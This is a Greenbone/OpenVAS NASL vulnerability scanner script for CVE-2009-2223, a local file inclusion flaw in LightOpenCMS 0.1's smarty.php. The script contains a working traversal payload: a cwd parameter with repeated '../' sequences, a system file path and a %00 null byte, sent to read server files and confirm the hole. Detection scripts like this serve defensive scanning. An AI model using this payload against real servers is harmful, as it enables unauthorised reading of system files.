if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100849" );
	script_version( "2021-08-04T02:26:48+0000" );
	script_tag( name: "last_modification", value: "2021-08-04 02:26:48 +0000 (Wed, 04 Aug 2021)" );
	script_tag( name: "creation_date", value: "2010-10-08 13:09:30 +0200 (Fri, 08 Oct 2010)" );
	script_tag( name: "cvss_base", value: "9.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:C/I:C/A:C" );
	script_cve_id( "CVE-2009-2223" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_name( "LightOpenCMS 'smarty.php' LFI Vulnerability" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "LightOpenCMS is prone to a local file include (LFI) vulnerability
  because it fails to properly sanitize user-supplied input.

  An attacker can exploit this vulnerability to obtain potentially sensitive information and
  execute arbitrary local scripts in the context of the webserver process. This may allow the
  attacker to compromise the application and the computer. Other attacks are also possible.

  LightOpenCMS 0.1 pre-alpha is vulnerable." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	script_xref( name: "URL", value: "https://www.securityfocus.com/bid/35497" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
files = traversal_files();
for dir in nasl_make_list_unique( "/", "/cms", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/smarty.php";
	res = http_get_cache( port: port, item: url );
	if(!res || !IsMatchRegexp( res, "^HTTP/1\\.[01] 200" )){
		continue;
	}
	for file in keys( files ) {
		url = dir + "/smarty.php?cwd=" + crap( data: "../", length: 3 * 9 ) + files[file] + "%00";
		if(http_vuln_check( port: port, url: url, pattern: file )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

